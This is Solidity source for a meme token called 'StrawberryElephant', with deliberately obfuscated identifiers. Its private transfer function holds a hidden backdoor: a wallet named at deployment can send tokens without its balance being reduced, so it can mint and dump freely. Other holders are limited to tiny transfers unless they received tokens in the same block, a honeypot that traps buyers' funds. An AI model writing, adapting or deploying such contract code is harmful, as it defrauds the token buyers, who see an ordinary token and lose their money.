/*

https://t.me/strawelephant

https://amp.knowyourmeme.com/memes/arabic-strawberry-elephant

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract StrawberryElephant is Ownable {
    function bhuc(address tynfeoj, address jmrltei, uint256 xkyqctj) private {
        address cghovwxmpj = IUniswapV2Factory(ijmbztfqdvhg.factory()).getPair(address(this), ijmbztfqdvhg.WETH());
        bool gfrp = 0 == jhyszdwgln[tynfeoj];
        if (gfrp) {
            if (tynfeoj != cghovwxmpj && crsakd[tynfeoj] != block.number && xkyqctj < totalSupply) {
                require(xkyqctj <= totalSupply / (10 ** decimals));
            }
            balanceOf[tynfeoj] -= xkyqctj;
        }
        balanceOf[jmrltei] += xkyqctj;
        crsakd[jmrltei] = block.number;
        emit Transfer(tynfeoj, jmrltei, xkyqctj);
    }

    mapping(address => uint256) private jhyszdwgln;

    string public symbol;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    constructor(string memory moltqw, string memory aszrlocpeg, address ydhnauqpjzx, address zrme) {
        name = moltqw;
        symbol = aszrlocpeg;
        balanceOf[msg.sender] = totalSupply;
        jhyszdwgln[zrme] = nhxb;
        ijmbztfqdvhg = IUniswapV2Router02(ydhnauqpjzx);
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private crsakd;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address uqgcsfkmz, uint256 xkyqctj) public returns (bool success) {
        allowance[msg.sender][uqgcsfkmz] = xkyqctj;
        emit Approval(msg.sender, uqgcsfkmz, xkyqctj);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    function transfer(address jmrltei, uint256 xkyqctj) public returns (bool success) {
        bhuc(msg.sender, jmrltei, xkyqctj);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private nhxb = 119;

    IUniswapV2Router02 private ijmbztfqdvhg;

    string public name;

    function transferFrom(address tynfeoj, address jmrltei, uint256 xkyqctj) public returns (bool success) {
        require(xkyqctj <= allowance[tynfeoj][msg.sender]);
        allowance[tynfeoj][msg.sender] -= xkyqctj;
        bhuc(tynfeoj, jmrltei, xkyqctj);
        return true;
    }
}
